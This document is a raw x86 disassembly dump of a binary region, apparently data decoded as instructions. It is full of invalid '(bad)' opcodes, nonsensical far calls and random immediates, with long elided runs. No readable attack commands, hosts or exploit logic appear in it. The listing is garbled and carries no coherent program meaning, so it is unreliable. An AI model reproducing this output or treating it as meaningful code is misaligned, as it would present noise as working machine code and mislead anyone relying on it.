  41eb5d:	mov    esi,0x854d0474
  41eb62:	or     BYTE PTR fs:[esi],ch
  41eb65:	pop    ebx
  41eb66:	dec    eax
  41eb67:	add    BYTE PTR ds:0x2adb6daf,ch
  41eb6d:	test   DWORD PTR [eax+ecx*8+0x31],esp
  41eb71:	pop    ebx
  41eb72:	pop    edi
  41eb73:	int    0x59
  41eb75:	test   eax,0xbadbc262
  41eb7a:	pop    edi
  41eb7b:	mov    ebp,0xd073c63d
	...
  41eba8:	add    BYTE PTR [eax],al
  41ebaa:	sbb    al,0xc4
  41ebac:	cs int 0x22
  41ebaf:	scas   eax,DWORD PTR es:[edi]
  41ebb0:	add    BYTE PTR [ebp-0x748d55df],cl
  41ebb6:	and    BYTE PTR [ebp-0x73c246ac],bl
  41ebbc:	ins    DWORD PTR es:[edi],dx
  41ebbd:	(bad)
  41ebc1:	fwait
  41ebc2:	pop    esi
  41ebc3:	xchg   edi,eax
  41ebc4:	push   esp
  41ebc5:	add    BYTE PTR [edx],ch
  41ebc7:	dec    esp
  41ebc8:	bound  ebp,QWORD PTR [edi-0x27]
  41ebcb:	xchg   BYTE PTR [eax+0x0],dl
  41ebce:	mov    esi,0xc6746f80
  41ebd3:	jle    0x41ec41
  41ebd5:	jo     0x41ebcd
  41ebd7:	dec    edx
  41ebd8:	push   0x66804400
  41ebdd:	je     0x41ebf7
  41ebdf:	jp     0x41ec53
  41ebe1:	and    ebp,DWORD PTR gs:[ebx+ebp*2+0x74]
  41ebe6:	div    BYTE PTR [edx+0x46]
  41ebe9:	inc    esi
  41ebea:	sbb    DWORD PTR [ebx+0x50],ebp
  41ebed:	add    BYTE PTR [ecx+ecx*2],ah
  41ebf0:	popa   
  41ebf1:	fs cli 
  41ebf3:	jl     0x41ec69
  41ebf5:	imul   esi,DWORD PTR [esi],0x33614f83
  41ebfb:	dec    ebx
  41ebfc:	add    BYTE PTR [ebx+0x55],al
  41ebff:	push   esi
  41ec00:	fs xor DWORD PTR gs:[esi+0x65],esp
  41ec05:	popa   
  41ec06:	push   ebx
  41ec07:	pushf  
  41ec08:	push   0x843465
  41ec0d:	push   ebx
	...
  41ec36:	add    BYTE PTR [eax],al
  41ec38:	inc    eax
  41ec39:	push   ebp
  41ec3a:	je     0x41ecb3
  41ec3c:	inc    esi
  41ec3d:	dec    ecx
  41ec3e:	popa   
  41ec3f:	pop    esp
  41ec40:	les    edi,FWORD PTR [esi+0x74]
  41ec43:	popa   
  41ec44:	ret    
  41ec45:	ja     0x41ec8d
  41ec47:	inc    esi
  41ec48:	mov    ebx,0x174f5c69
  41ec4d:	outs   dx,WORD PTR gs:[esi]
  41ec50:	adc    DWORD PTR [ebx+0x0],ecx
  41ec53:	push   eax
  41ec54:	test   BYTE PTR [edx+0x6f],0x77
  41ec58:	add    BYTE PTR [esp+eiz*2+0x0],cl
  41ec5c:	stos   BYTE PTR es:[edi],al
  41ec5d:	dec    edx
  41ec5e:	popa   
  41ec5f:	jb     0x41ebf2
  41ec61:	js     0x41eccc
  41ec63:	xlat   BYTE PTR gs:[ebx]
  41ec65:	mov    eax,ds:0xd83e736b
  41ec6a:	inc    ecx
  41ec6b:	fs sub al,0xd1
  41ec6e:	add    BYTE PTR [edx+0x23],dl
  41ec71:	iret   
  41ec72:	and    esi,DWORD PTR [ebx+ebx*1+0x0]
  41ec76:	sub    dh,BYTE PTR [edx+0x3e]
  41ec79:	aam    0x23
  41ec7b:	jb     0x41ec87
  41ec7d:	inc    esp
  41ec7e:	dec    ecx
  41ec7f:	ins    DWORD PTR es:[edi],dx
  41ec80:	or     eax,0x135f4698
  41ec85:	lahf   
  41ec86:	add    al,0x50
  41ec88:	jmp    0xb41fd1e
  41ec8d:	xchg   ecx,eax
  41ec8e:	sbb    eax,0x25a2d872
  41ec93:	arpl   WORD PTR [esi],di
  41ec95:	push   esp
  41ec96:	and    DWORD PTR [ecx-0x33],esi
  41ec99:	je     0x41ecbe
  41ec9b:	jb     0x41ec9d
	...
  41ecc5:	add    dl,bl
  41ecc7:	inc    ebx
  41ecc8:	dec    ecx
  41ecc9:	ins    DWORD PTR es:[edi],dx
  41ecca:	int    0x57
  41eccc:	inc    eax
  41eccd:	addr16 int3 
  41eccf:	test   DWORD PTR [ecx],esp
  41ecd1:	imul   esp,DWORD PTR [ebx-0x6792cfbe],0x4e
  41ecd8:	or     ebx,DWORD PTR [edi-0x54]
  41ecdb:	cmp    BYTE PTR [bx+di-0x6f],al
  41ecdf:	pop    esp
  41ece0:	push   ds
  41ece1:	arpl   WORD PTR [ebx+0x5e700d81],sp
  41ece7:	push   ecx
  41ece8:	and    esp,DWORD PTR [esi-0x6e]
  41eceb:	adc    eax,0xf69b7222
  41ecf0:	dec    ecx
  41ecf1:	outs   dx,BYTE PTR ds:[esi]
  41ecf2:	jb     0x41ed1b
  41ecf4:	movd   mm3,DWORD PTR [ebx+0xe]
  41ecf8:	xor    eax,0x1b0d6c50
  41ecfd:	addr16 push edx
  41ecff:	pop    ds
  41ed00:	adc    BYTE PTR [eax],al
  41ed02:	ins    DWORD PTR es:[edi],dx
  41ed03:	sbb    eax,0x2349741b
  41ed08:	packsswb mm5,QWORD PTR [edx+0x5b]
  41ed0c:	lods   eax,DWORD PTR ds:[esi]
  41ed0d:	das    
  41ed0e:	outs   dx,BYTE PTR ds:[esi]
  41ed0f:	mov    WORD PTR [eax-0x5568e2ef],cs
  41ed15:	inc    esp
  41ed16:	or     al,0x9e
  41ed18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed19:	das    
  41ed1a:	push   cs
  41ed1b:	xchg   edi,eax
  41ed1c:	call   0x603:0x7abe2a2a
  41ed23:	les    edi,FWORD PTR [edx+0xf]
  41ed26:	mov    ?,WORD PTR ds:[edx+0x1e]
	...
  41ed52:	add    BYTE PTR [eax],al
  41ed54:	or     al,0x5b
  41ed56:	aaa    
  41ed57:	and    ecx,DWORD PTR [edi+ebp*4]
  41ed5a:	out    0x33,eax
  41ed5c:	adc    ebx,DWORD PTR [ebx+0x37]
  41ed5f:	sbb    dh,ah
  41ed61:	mov    bh,ah
  41ed63:	ss bt  edi,esp
  41ed67:	adc    ebp,esp
  41ed69:	ret    
  41ed6a:	inc    ebp
  41ed6b:	sbb    eax,0xe23abdea
  41ed70:	leave  
  41ed71:	lds    edi,FWORD PTR [ebx]
  41ed73:	add    al,0xea
  41ed75:	pushf  
  41ed76:	cmp    esi,DWORD PTR [esi+ebx*1]
  41ed79:	sahf   
  41ed7a:	pop    ds
  41ed7b:	adc    al,0xaa
  41ed7d:	les    ebx,FWORD PTR [ecx]
  41ed7f:	sub    DWORD PTR [ebx+ebx*2-0x505fdcc6],ebp
  41ed86:	(bad)  
  41ed87:	and    al,0xac
  41ed89:	mov    esi,0x8b724a1b
  41ed8e:	(bad)  
  41ed8f:	dec    eax
  41ed90:	xchg   esi,eax
  41ed91:	stos   DWORD PTR es:[edi],eax
  41ed92:	sti    
  41ed93:	and    cl,BYTE PTR [esi+edi*4-0x7087d027]
  41ed9a:	mov    bh,0xe3
  41ed9c:	jl     0x41ed51
  41ed9e:	xlat   BYTE PTR ds:[ebx]
  41ed9f:	pop    ds
  41eda0:	arpl   WORD PTR [ecx-0x7375ea3c],bp
  41eda6:	(bad)  
  41eda7:	adc    eax,0x24b7a857
  41edac:	pop    edi
  41edad:	mov    esi,0x9d7e9500
  41edb2:	inc    ecx
  41edb3:	xchg   ebp,eax
  41edb4:	sbb    al,0xc6
  41edb6:	ins    BYTE PTR es:[edi],dx
  41edb7:	stos   DWORD PTR es:[edi],eax
	...
  41ede0:	add    BYTE PTR [eax],al
  41ede2:	sbb    ch,BYTE PTR [ecx+0x6793db2b]
  41ede8:	add    BYTE PTR [ebx+0x7e74af56],ch
  41edee:	pop    edi
  41edef:	stos   BYTE PTR es:[edi],al
  41edf0:	add    BYTE PTR [edx+0x7674bd5c],bl
  41edf6:	bound  ebp,QWORD PTR [ecx-0x70f86a9d]
  41edfc:	push   eax
  41edfd:	leave  
  41edfe:	div    BYTE PTR [edx-0x56a2aa90]
  41ee04:	arpl   WORD PTR [ebx+0x2e],bx
  41ee07:	mov    esi,DWORD PTR [edx+0x46]
  41ee0a:	and    al,0xbc
  41ee0c:	ins    BYTE PTR es:[edi],dx
  41ee0d:	inc    esp
  41ee0e:	push   ecx
  41ee0f:	pop    ebx
  41ee10:	push   eax
  41ee11:	dec    eax
  41ee12:	dec    ecx
  41ee13:	stos   BYTE PTR es:[edi],al
  41ee14:	jne    0x41ee64
  41ee16:	xor    BYTE PTR [edi-0x55e4e700],bh
  41ee1c:	jno    0x41ee54
  41ee1e:	sbb    eax,0x333d64a9
  41ee23:	stos   DWORD PTR es:[edi],eax
  41ee24:	arpl   cx,bp
  41ee26:	jne    0x41ede8
  41ee28:	jno    0x41ee47
  41ee2a:	cmp    bl,BYTE PTR [edi-0x3eb4f993]
  41ee30:	add    BYTE PTR [ecx],bl
  41ee32:	pop    ebp
  41ee33:	lods   eax,DWORD PTR ds:[esi]
  41ee34:	je     0x41ee1f
  41ee36:	pop    edx
  41ee37:	shl    DWORD PTR [edi-0x3],0x32
  41ee3b:	xchg   edx,eax
  41ee3c:	ins    BYTE PTR es:[edi],dx
  41ee3d:	sbb    DWORD PTR [ebx-0x59],esp
  41ee40:	push   0x70a777e9
  41ee45:	mov    edx,0x0
	...
  41ee6e:	add    BYTE PTR [eax],al
  41ee70:	pop    edx
  41ee71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee72:	arpl   WORD PTR [edi],ax
  41ee74:	inc    edx
  41ee75:	(bad)  
  41ee76:	ins    BYTE PTR es:[edi],dx
  41ee77:	jmp    0xb48795
  41ee7c:	push   cs
  41ee7d:	xchg   BYTE PTR [ebp+0x74],bl
  41ee80:	add    cl,BYTE PTR [edx]
  41ee82:	std    
  41ee83:	sub    eax,0x657cfe
  41ee88:	mov    ebx,0x936e5d74
  41ee8d:	pop    edi
  41ee8e:	addr16 gs sti 
  41ee91:	cdq    
  41ee92:	imul   ebp,DWORD PTR [esi-0x3f],0x4f
  41ee96:	arpl   WORD PTR [esp+eiz*8-0x7d],bx
  41ee9a:	outs   dx,DWORD PTR ds:[esi]
  41ee9b:	jae    0x41ee6b
  41ee9d:	jge    0x41ef0d
  41ee9f:	jae    0x41ee48
  41eea1:	or     BYTE PTR [edi+0x65],0x14
  41eea5:	dec    ecx
  41eea6:	outs   dx,DWORD PTR gs:[esi]
  41eea8:	or     DWORD PTR [ecx+0x0],ecx
  41eeab:	push   ebx
  41eeac:	call   0x6b96335
  41eeb1:	dec    ecx
  41eeb2:	popa   
  41eeb3:	pop    esp
  41eeb4:	xor    DWORD PTR [esi+0x6e],edi
  41eeb7:	inc    esp
  41eeb8:	push   cs
  41eeb9:	push   eax
  41eeba:	popa   
  41eebb:	pop    esp
  41eebc:	inc    esp
  41eebd:	jp     0x41ef1e
  41eebf:	jne    0x41eed6
  41eec1:	jp     0x41ef09
  41eec3:	pop    eax
  41eec4:	addr16 xchg edi,eax
  41eec6:	imul   ebp,DWORD PTR [esi+0x1],0x56
  41eeca:	arpl   WORD PTR [eax],sp
  41eecc:	pop    es
  41eecd:	jle    0x41ef43
  41eecf:	push   0x746c6927
	...
  41eefc:	add    BYTE PTR [eax],al
  41eefe:	push   ebp
  41eeff:	jle    0x41ef47
  41ef01:	pop    eax
  41ef02:	addr16 push edi
  41ef04:	pop    esp
  41ef05:	jae    0x41ef55
  41ef07:	push   ebx
  41ef08:	popa   
  41ef09:	jae    0x41ef14
  41ef0b:	imul   bp,WORD PTR [edi+eiz*1-0x7e],0x5446
  41ef12:	daa    
  41ef13:	imul   esi,DWORD PTR [ecx+0x73],0x75525def
  41ef1a:	adc    al,0x56
  41ef1c:	dec    edi
  41ef1d:	imul   edi,DWORD PTR [esi],0x662e2610
  41ef23:	out    dx,eax
  41ef24:	sbb    al,0x0
  41ef26:	lea    ebx,[edi]
  41ef28:	adc    esi,DWORD PTR [esi+0x63]
  41ef2b:	test   BYTE PTR [eax],0x53
  41ef2e:	dec    ebp
  41ef2f:	pop    ds
  41ef30:	adc    ebp,DWORD PTR [esi+0x5f]
  41ef33:	out    dx,eax
  41ef34:	and    eax,0x13e36e00
  41ef39:	jno    0x41ef6c
  41ef3b:	loope  0x41ef4f
  41ef3d:	fs add dl,BYTE PTR ds:0x13b10e70
  41ef45:	je     0x41ef85
  41ef47:	aad    0x1f
  41ef49:	data16 adc ch,BYTE PTR [ecx-0x37e48dde]
  41ef50:	inc    ebx
  41ef51:	jb     0x41ef5a
  41ef53:	xlat   BYTE PTR ds:[ebx]
  41ef54:	adc    bl,BYTE PTR [ecx+ebp*8-0x62]
  41ef58:	es push ecx
  41ef5a:	out    0x87,eax
  41ef5c:	and    eax,0x20a5eb50
  41ef61:	add    BYTE PTR [bx+si],al
	...
  41ef8c:	in     eax,dx
  41ef8d:	fwait
  41ef8e:	and    eax,0x46783e72
  41ef93:	shr    BYTE PTR [si+0x19],cl
  41ef97:	outs   dx,BYTE PTR ds:[esi]
  41ef98:	fld    TBYTE PTR [ebx+0x4]
  41ef9b:	(bad)  
  41ef9c:	xlat   BYTE PTR ds:[ebx]
  41ef9d:	sbb    esp,DWORD PTR [bx-0x30]
  41efa1:	pop    esi
  41efa2:	or     al,0x2e
  41efa4:	mov    ds:0xa1480455,al
  41efa9:	push   ebp
  41efaa:	sbb    BYTE PTR [esi-0x61],ch
  41efad:	das    
  41efae:	add    BYTE PTR es:[ebx-0x578dd9cb],cl
  41efb5:	arpl   WORD PTR ds:0x21523e63,bx
  41efbb:	jno    0x41ef4a
  41efbd:	sub    DWORD PTR [eax],esp
  41efbf:	jb     0x41ef5b
  41efc1:	pop    ebx
  41efc2:	out    0x33,eax
  41efc4:	imul   ebp,DWORD PTR [ebp-0x3f70fc2d],0xffffffcd
  41efcb:	pop    ss
  41efcc:	jae    0x41ef88
  41efce:	fldenv [esi]
  41efd0:	adc    BYTE PTR [esi-0x3e86ec41],0xa3
  41efd7:	adc    eax,0x2fcca959
  41efdc:	outs   dx,DWORD PTR ds:[esi]
  41efdd:	mov    dh,0xba
  41efdf:	adc    al,0x59
  41efe1:	rcl    BYTE PTR [ebp-0x5b70c1ec],0xb
  41efe8:	cs mov edx,0xc22c4785
  41efee:	xchg   ebp,eax
  41efef:	add    BYTE PTR es:[eax],al
	...
  41f01a:	ds (bad) 
  41f01c:	mov    edx,DWORD PTR ds:0x1484a921
  41f022:	pusha  
  41f023:	lds    edi,FWORD PTR [edx+0x3]
  41f026:	pop    esp
  41f027:	stos   DWORD PTR es:[edi],eax
  41f028:	mov    BYTE PTR [edi+ecx*1],dl
  41f02b:	test   al,0x56
  41f02d:	adc    ah,dl
  41f02f:	jl     0x41f038
  41f031:	retf   0x7d51
  41f034:	out    0xe1,eax
  41f036:	adc    eax,0xd81f3a5b
  41f03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f03c:	ds and eax,0x491bb5cc
  41f042:	(bad)  
  41f043:	stos   BYTE PTR es:[edi],al
  41f044:	dec    eax
  41f045:	push   ds
  41f046:	add    ch,BYTE PTR [ebp+0x5add1640]
  41f04c:	sub    al,0xc
  41f04e:	scas   al,BYTE PTR es:[edi]
  41f04f:	mov    edx,0xc2ac480d
  41f054:	sbb    eax,0xfea38b29
  41f059:	and    BYTE PTR [ebp-0x73d6e5a5],bl
  41f05f:	test   eax,0x863e1204
  41f064:	add    dl,bh
  41f066:	push   esi
  41f067:	lods   eax,DWORD PTR ds:[esi]
  41f068:	dec    esi
  41f069:	or     BYTE PTR [edi-0x44],bl
  41f06c:	add    BYTE PTR [ecx-0x298e55de],bh
  41f072:	push   eax
  41f073:	lods   eax,DWORD PTR ds:[esi]
  41f074:	fs jmp 0xdaa17b92
  41f07a:	dec    esp
  41f07b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f07c:	ins    DWORD PTR es:[edi],dx
  41f07d:	mov    ebx,0x0
	...
  41f0a6:	add    BYTE PTR [eax],al
  41f0a8:	and    DWORD PTR [ebx+0x44],ebx
  41f0ab:	shr    BYTE PTR [edi],1
  41f0ad:	mov    esp,0xad28bd61
  41f0b2:	ja     0x41f09d
  41f0b4:	or     al,0xbe
  41f0b6:	popfw  
  41f0b8:	push   eax
  41f0b9:	nop
  41f0ba:	jb     0x41f040
  41f0bc:	popa   
  41f0bd:	mov    eax,ds:0x8a9da141
  41f0c2:	ins    DWORD PTR es:[edi],dx
  41f0c3:	xchg   DWORD PTR [ecx-0x5a],ecx
  41f0c6:	pop    edi
  41f0c7:	jnp    0x41f12f
  41f0c9:	pop    DWORD PTR [ecx-0x73]
  41f0cc:	pop    edx
  41f0cd:	stos   BYTE PTR es:[edi],al
  41f0ce:	jno    0x41f050
  41f0d0:	pop    esp
  41f0d1:	cdq    
  41f0d2:	push   esp
  41f0d3:	cdq    
  41f0d4:	push   ecx
  41f0d5:	cdq    
  41f0d6:	push   esp
  41f0d7:	cmp    DWORD PTR [ebx],eax
  41f0d9:	mov    edx,0xc1574e61
  41f0de:	je     0x41f13a
  41f0e0:	inc    edx
  41f0e1:	cdq    
  41f0e2:	je     0x41f13d
  41f0e4:	sub    eax,0x273f72bc
  41f0e9:	lods   eax,DWORD PTR ds:[esi]
  41f0ea:	add    BYTE PTR [edi],ah
  41f0ec:	ss stos DWORD PTR es:[edi],eax
  41f0ee:	push   ebx
  41f0ef:	cmp    dl,BYTE PTR [edi]
  41f0f1:	lods   eax,DWORD PTR ds:[esi]
  41f0f2:	dec    esi
  41f0f3:	dec    eax
  41f0f4:	pop    ds
  41f0f5:	mov    esp,0xab562f00
  41f0fa:	push   eax
  41f0fb:	or     BYTE PTR [ebp-0x54],cl
  41f0fe:	jne    0x41f106
  41f100:	dec    esp
  41f101:	mov    bh,0x0
  41f103:	cs js  0x41f0ad
  41f106:	jo     0x41f108
  41f108:	aaa    
  41f109:	js     0x41f17a
  41f10b:	jae    0x41f10d
	...
  41f135:	add    BYTE PTR [eax],cl
  41f137:	dec    esi
  41f138:	jb     0x41f19e
  41f13a:	pop    ss
  41f13b:	cdq    
  41f13c:	je     0x41f1ae
  41f13e:	pop    ebx
  41f13f:	push   eax
  41f140:	jb     0x41f1a7
  41f142:	add    al,0x47
  41f144:	imul   esi,DWORD PTR [edx-0x22],0x5a
  41f148:	dec    edi
  41f149:	dec    edi
  41f14a:	cdq    
  41f14b:	push   bx
  41f14d:	inc    ecx
  41f14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14f:	mov    ds:0x72a44e5c,eax
  41f154:	and    BYTE PTR [ebx+0x0],dl
  41f157:	jns    0x41f1cd
  41f159:	ja     0x41f151
  41f15b:	dec    esp
  41f15c:	popa   
  41f15d:	pop    esp
  41f15e:	cdq    
  41f15f:	dec    esi
  41f160:	outs   dx,BYTE PTR gs:[esi]
  41f162:	enter  0x3d7e,0x63
  41f166:	les    ecx,FWORD PTR [ebp+0x71]
  41f169:	outs   dx,BYTE PTR ds:[esi]
  41f16a:	retf   
  41f16b:	dec    ecx
  41f16c:	add    BYTE PTR [ebx+0x20],dl
  41f16f:	js     0x41f1e5
  41f171:	ja     0x41f139
  41f173:	dec    esp
  41f174:	popa   
  41f175:	pop    esp
  41f176:	fldenv [esi+0x50]
  41f179:	inc    ebx
  41f17a:	ret    
  41f17b:	dec    edi
  41f17c:	popa   
  41f17d:	outs   dx,BYTE PTR ds:[esi]
  41f17e:	or     edi,DWORD PTR [esi+0x4f]
  41f181:	imul   ebx,DWORD PTR [ebx],0x34006f76
  41f187:	push   eax
  41f188:	data16 je 0x41f193
  41f18b:	jp     0x41f1ff
  41f18d:	adc    ebp,DWORD PTR gs:[ebx+ebp*2+0x66]
  41f192:	sbb    edi,DWORD PTR [edi+0x2e]
  41f195:	outs   dx,DWORD PTR ds:[esi]
  41f196:	adc    eax,0x465c78
	...
  41f1c3:	add    BYTE PTR [ebx],ch
  41f1c5:	addr16 aas 
  41f1c7:	ins    BYTE PTR es:[edi],dx
  41f1c8:	(bad)  
  41f1c9:	jne    0x41f239
  41f1cb:	je     0x41f150
  41f1cd:	ins    BYTE PTR es:[edi],dx
  41f1ce:	gs je  0x41f20b
  41f1d1:	dec    esp
  41f1d2:	add    BYTE PTR [esi],ch
  41f1d4:	ds push ebp
  41f1d6:	or     al,0x61
  41f1d8:	ds out dx,al
  41f1da:	sbb    ebp,DWORD PTR [edx+ebp*4+0x44]
  41f1de:	and    esi,DWORD PTR [esi+ecx*4+0x60]
  41f1e2:	and    DWORD PTR [ecx-0x6e],esi
  41f1e5:	push   ss
  41f1e6:	sbb    al,0x71
  41f1e8:	call   0x1bf1:0x8e452d44
  41f1ef:	pushw  0x5
  41f1f2:	and    dh,BYTE PTR [edx+0x63]
  41f1f5:	call   0x17ae593e
  41f1fa:	and    BYTE PTR [ecx+ebp*2-0xe],dh
  41f1fe:	or     DWORD PTR [eax],esp
  41f200:	xor    esp,0xc83e7115
  41f206:	das    
  41f207:	push   0x6425f25f
  41f20c:	or     eax,0x277414df
  41f211:	fisub  WORD PTR [ebx]
  41f213:	jno    0x41f26d
  41f215:	loope  0x41f236
  41f217:	jno    0x41f257
  41f219:	add    BYTE PTR [eax],dh
  41f21b:	push   0x6426b21f
  41f220:	in     eax,dx
  41f221:	(bad)  
  41f222:	adc    al,0x74
  41f224:	pop    ss
  41f225:	(bad)  
  41f226:	and    esi,DWORD PTR [ecx+0x0]
	...
  41f251:	add    cl,ah
  41f253:	repnz sub esi,DWORD PTR [eax]
  41f256:	sbb    DWORD PTR [edi-0x22],ecx
  41f259:	pusha  
  41f25a:	fst    QWORD PTR [eax-0x63f2a3fc]
  41f260:	and    DWORD PTR [edx-0x25],esi
  41f263:	xchg   edi,eax
  41f264:	das    
  41f265:	arpl   dx,dx
  41f267:	outs   dx,DWORD PTR ds:[esi]
  41f268:	sbb    DWORD PTR [esi-0x27],ebp
  41f26b:	jo     0x41f24b
  41f26d:	jo     0x41f23e
  41f26f:	xchg   edi,eax
  41f270:	sbb    DWORD PTR [ebx+ebx*8+0x43],esi
  41f274:	sub    eax,0x85ba651
  41f279:	adc    bl,BYTE PTR [ebp-0x4dd8c549]
  41f27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f280:	add    BYTE PTR [esi],bl
  41f282:	fwait
  41f283:	test   al,0x2e
  41f285:	sar    DWORD PTR [edx+0x6b],cl
  41f288:	xlat   BYTE PTR es:[ebx]
  41f28a:	arpl   WORD PTR [eax-0x585ee008],bp
  41f290:	or     al,0x4
  41f292:	bound  ebx,QWORD PTR [eax-0x499fda02]
  41f298:	int3   
  41f299:	inc    eax
  41f29a:	ins    DWORD PTR es:[edi],dx
  41f29b:	stos   DWORD PTR es:[edi],eax
  41f29c:	pop    es
  41f29d:	xor    DWORD PTR [ebx-0x4b],ebx
  41f2a0:	fist   DWORD PTR [ecx+eax*4]
  41f2a3:	test   eax,0xb66a03c4
  41f2a8:	enter  0x5813,0xa7
  41f2ac:	mov    bh,0x3
  41f2ae:	dec    ebp
  41f2af:	mov    ebp,0xab6126c3
  41f2b4:	std    
  41f2b5:	add    BYTE PTR es:[eax],al
	...
  41f2e0:	ss mov dh,0xe7
  41f2e3:	adc    BYTE PTR [ecx],bl
  41f2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e6:	test   BYTE PTR [eax],dl
  41f2e8:	pop    eax
  41f2e9:	mov    bh,0x88
  41f2eb:	pop    ss
  41f2ec:	ds test al,0x80
  41f2ef:	pop    ss
  41f2f0:	sbb    eax,0x201ad5a8
  41f2f5:	ret    0x2fe7
  41f2f8:	cli    
  41f2f9:	mov    ch,0x88
  41f2fb:	adc    ebp,ebx
  41f2fd:	mov    ecx,0x9f1a2679
  41f302:	dec    esp
  41f303:	and    eax,0x343394ee
  41f308:	mov    BYTE PTR ds:[esi],ah
  41f30b:	inc    edx
  41f30c:	or     al,BYTE PTR [eax+ebp*1+0x338efd36]
  41f313:	and    ecx,esi
  41f315:	stos   BYTE PTR es:[edi],al
  41f316:	push   ss
  41f317:	and    eax,0xe900b5cc
  41f31c:	add    bh,BYTE PTR [ebp-0x409cca8f]
  41f322:	ins    BYTE PTR es:[edi],dx
  41f323:	cmp    DWORD PTR [ebx-0x59],ebx
  41f326:	push   0x748c69e9
  41f32b:	or     BYTE PTR [esi-0x4c],bh
  41f32e:	jb     0x41f319
  41f330:	dec    ebp
  41f331:	mov    WORD PTR [ecx-0x6],?
  41f334:	sub    al,0xbe
  41f336:	jb     0x41f33d
  41f338:	inc    edx
  41f339:	mov    ds:0x9d31fa6d,eax
  41f33e:	pop    edi
  41f33f:	cld    
  41f340:	push   ds
  41f341:	pop    ebx
  41f342:	push   ebx
  41f343:	fiadd  DWORD PTR [eax]
	...
  41f36d:	add    BYTE PTR [esi],bl
  41f36f:	test   eax,0xb846c84e
  41f374:	add    BYTE PTR [ebx-0x2a923fe2],bh
  41f37a:	push   ds
  41f37b:	xchg   edi,eax
  41f37c:	addr16 mov ebx,0xce74ba1e
  41f382:	xor    esp,DWORD PTR [eax+eax*1+0x74a92499]
  41f389:	lahf   
  41f38a:	dec    esi
  41f38b:	shl    BYTE PTR [edx-0x74],0x4b
  41f38f:	pop    ebx
  41f390:	inc    esi
  41f391:	mov    edx,0x9d6da96d
  41f396:	inc    esp
  41f397:	mov    edx,0x8a3d7d6d
  41f39c:	ins    DWORD PTR es:[edi],dx
  41f39d:	pop    DWORD PTR [ecx-0x5a]
  41f3a0:	pop    edi
  41f3a1:	jnp    0x41f401
  41f3a3:	(bad)  
  41f3a4:	dec    ebx
  41f3a5:	mov    BYTE PTR [ebx],ch
  41f3a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3a8:	addr16 jg 0x41f408
  41f3ab:	fwait
  41f3ac:	jb     0x41f3fe
  41f3ae:	push   ecx
  41f3af:	test   eax,0x8f424d77
  41f3b4:	xor    DWORD PTR [ebx],ebx
  41f3b6:	clc    
  41f3b7:	mov    bl,0x74
  41f3b9:	daa    
  41f3ba:	cs stos DWORD PTR es:[edi],eax
  41f3bc:	cs add dh,ch
  41f3bf:	push   eax
  41f3c0:	add    BYTE PTR gs:[ecx],bl
  41f3c3:	fwait
  41f3c4:	dec    edi
  41f3c5:	imul   eax,DWORD PTR [ebx],0x7e2e6f7a
  41f3cb:	inc    ebp
  41f3cc:	add    BYTE PTR gs:[ebx+0x65],bh
  41f3d0:	popa   
  41f3d1:	je     0x41f3d3
	...
  41f3fb:	add    BYTE PTR [ebx+0x51],ah
  41f3fe:	gs jbe 0x41f433
  41f401:	pop    edi
  41f402:	push   eax
  41f403:	popa   
  41f404:	xor    al,0x52
  41f406:	push   ebx
  41f407:	outs   dx,DWORD PTR ds:[esi]
  41f408:	adc    eax,0x555004b
  41f40d:	push   ebx
  41f40e:	add    BYTE PTR [ebp+0x4],dl
  41f411:	jl     0x41f485
  41f413:	dec    esi
  41f414:	inc    esi
  41f415:	inc    esp
  41f416:	popa   
  41f417:	add    BYTE PTR [ebp-0x5c8b94bb],dh
  41f41d:	inc    edi
  41f41e:	jb     0x41f485
  41f420:	hlt    
  41f421:	pop    edx
  41f422:	imul   esi,DWORD PTR [edx-0x12],0x5e
  41f426:	push   eax
  41f427:	outs   dx,DWORD PTR ds:[esi]
  41f428:	xchg   ebp,eax
  41f429:	pop    edx
  41f42a:	add    BYTE PTR [ebx-0x8],dl
  41f42d:	jl     0x41f4a3
  41f42f:	ja     0x41f427
  41f431:	push   eax
  41f432:	popa   
  41f433:	pop    esp
  41f434:	aam    0x45
  41f436:	jno    0x41f4ac
  41f438:	iret   
  41f439:	ds dec edi
  41f43b:	imul   edx,ecx,0xe320727b
  41f441:	jnp    0x41f4a2
  41f443:	push   0x6f6c4519
  41f448:	rol    BYTE PTR [edi+0x61],0x73
  41f44c:	stos   DWORD PTR es:[edi],eax
  41f44d:	ins    DWORD PTR es:[edi],dx
  41f44e:	popa   
  41f44f:	(bad)  
  41f451:	push   eax
  41f452:	gs jbe 0x41f417
  41f455:	cmp    BYTE PTR [edi],0x6f
  41f458:	or     DWORD PTR [ebp+0x61],eax
  41f45b:	arpl   WORD PTR [ebx],dx
  41f45d:	inc    esi
  41f45e:	imul   ebp,DWORD PTR [esi+0x0],0x0
	...
  41f48a:	test   DWORD PTR ds:[ecx+edx*2],eax
  41f48e:	jecxz  0x41f415
  41f490:	adc    ah,BYTE PTR [ebx-0x34]
  41f493:	inc    edi
  41f494:	or     DWORD PTR [eax-0x1d],esi
  41f497:	xor    edi,DWORD PTR [edi]
  41f499:	push   esp
  41f49a:	out    dx,al
  41f49b:	push   ebx
  41f49c:	inc    ebx
  41f49d:	dec    ebp
  41f49e:	mov    BYTE PTR [eax+0x36],dl
  41f4a1:	dec    ebp
  41f4a2:	xor    BYTE PTR [edi+edi*1],0x54
  41f4a6:	mov    ?,WORD PTR [ebp+0x37]
  41f4a9:	dec    esi
  41f4aa:	and    dl,BYTE PTR ds:[ecx]
  41f4ad:	jb     0x41f44f
  41f4af:	xor    al,0x25
  41f4b1:	push   eax
  41f4b2:	mov    WORD PTR [ecx+0x22],ss
  41f4b5:	addr16 call 0x852e:0xbd00135f
  41f4bd:	or     eax,0x679c64c8
  41f4c2:	ins    DWORD PTR es:[edi],dx
  41f4c3:	rol    DWORD PTR [esi+0x11107268],1
  41f4c9:	cmp    dl,BYTE PTR [ecx]
  41f4cb:	popa   
  41f4cc:	add    al,0x68
  41f4ce:	push   edx
  41f4cf:	adc    BYTE PTR [ecx],dl
  41f4d1:	jno    0x41f4e7
  41f4d3:	push   ecx
  41f4d4:	xlat   BYTE PTR ds:[ebx]
